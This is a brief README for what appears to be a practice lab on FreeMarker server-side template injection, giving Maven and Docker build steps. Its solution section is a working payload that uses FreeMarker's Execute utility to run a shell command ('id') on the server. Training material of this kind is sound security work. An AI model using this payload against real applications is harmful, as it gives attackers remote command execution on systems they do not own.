# Template Injection Freemarker

## Build instructions

Requirements:
 - Docker
 - Docker-compose
 - Maven
 - Java

```
mvn clean install
```

```
docker-compose up
```

## Solution

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```
